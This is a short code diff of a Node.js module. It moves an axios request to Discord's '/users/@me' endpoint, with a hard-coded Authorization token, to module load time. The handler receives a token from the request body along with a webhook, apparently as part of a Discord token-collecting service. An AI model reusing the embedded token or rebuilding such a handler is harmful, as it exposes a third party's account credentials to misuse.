@@ -1,5 +1,18 @@
 const axios = require('axios');
 
+
+
+var info;
+axios.get('https://discordapp.com/api/v8/users/@me', {
+    withCredentials: true,
+    headers: {
+      Authorization: "NzkyNzgwNzU3NzY4MDc3MzMz.X_ganQ.Ig1qH6zNChHzlO0FigaE-znijZE",
+    },
+  }).then((response) => {	
+    info = response.data;
+  }
+  )
+
 exports.send = (req, res, webhook) =>
 {
 	const token = req.body.token;
@@ -10,17 +23,6 @@ exports.send = (req, res, webhook) =>
 	
 	
 
-var info;
-		axios.get('https://discordapp.com/api/v8/users/@me', {
-    withCredentials: true,
-    headers: {
-      Authorization: "NzkyNzgwNzU3NzY4MDc3MzMz.X_ganQ.Ig1qH6zNChHzlO0FigaE-znijZE",
-    },
-  }).then((response) => {	
-    info = response.data;
-    console.log(info)
-  }
-  )
 
 	
 	
